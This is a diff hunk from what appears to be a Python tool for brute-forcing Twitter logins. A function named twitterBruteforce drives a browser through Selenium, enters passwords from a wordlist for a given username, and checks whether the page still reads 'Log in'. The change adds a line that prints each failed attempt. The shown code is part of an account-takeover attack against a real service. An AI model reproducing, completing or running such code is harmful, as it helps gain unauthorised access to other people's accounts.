@@ -37,6 +37,7 @@ def twitterBruteforce(username, wordlist, delay):
             elem.clear()
             elem.send_keys(password)
             elem.send_keys(Keys.RETURN)
+            print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
             sleep(delay)
             assert (("Log in") in driver.title)
         except AssertionError:
